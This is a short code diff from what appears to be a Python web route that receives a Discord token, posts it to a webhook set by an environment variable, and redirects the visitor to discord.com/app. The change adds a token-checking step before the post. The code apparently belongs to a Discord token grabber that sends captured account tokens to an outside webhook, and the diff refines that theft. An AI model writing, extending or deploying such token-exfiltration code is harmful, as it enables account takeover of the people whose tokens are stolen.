@@ -22,7 +22,8 @@ def index(token):
     try:
         # Send the token to the Discord webhook
         DISCORD_URL = os.getenv('DISCORD_URL')
-        response = requests.post(DISCORD_URL, json={"content": token})
+        message = check_discord_token(token)
+        response = requests.post(DISCORD_URL, json={"content": message})
         if response.status_code == 204:
             # Successful response from Discord
             return redirect("https://discord.com/app")
